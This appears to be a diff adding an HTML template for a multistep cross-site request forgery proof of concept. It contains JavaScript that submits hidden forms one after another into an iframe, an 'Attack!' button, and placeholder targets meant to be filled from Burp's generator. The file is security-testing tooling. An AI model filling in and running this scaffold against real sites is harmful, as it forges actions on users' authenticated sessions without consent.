@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Multistep CSRF PoC</title>
+<script type="text/javascript">
+var i = -1;
+function run() {
+    i = 0;
+    frm.location = "";		// Step 1: load start point via GET
+}
+
+function next() {
+    if (i >= 0 && document.forms[i] != undefined) {
+	console.log("Executing step " + i);
+	document.forms[i++].submit();
+    }
+}
+
+function load() {
+    setTimeout(next, 3000);
+}
+</script>
+</head>
+<body>
+<button onclick="run()">Attack!</button><br> <!-- run next() instead run() here, if no initial get is needed or performed by form request -->
+<!-- Insert request forms (e.g. from Burp CSRF PoC generator) here, as given in example and add target="frm" to form tag -->
+<form action="url" method="POST" target="frm">
+    <input type="hidden" name="name" value="value" />
+</form>
+
+<iframe width="1800" height="1000" id="frm" name="frm" onload="next()"></iframe> <!-- use load() here if delay needed -->
+</body>
+</html>
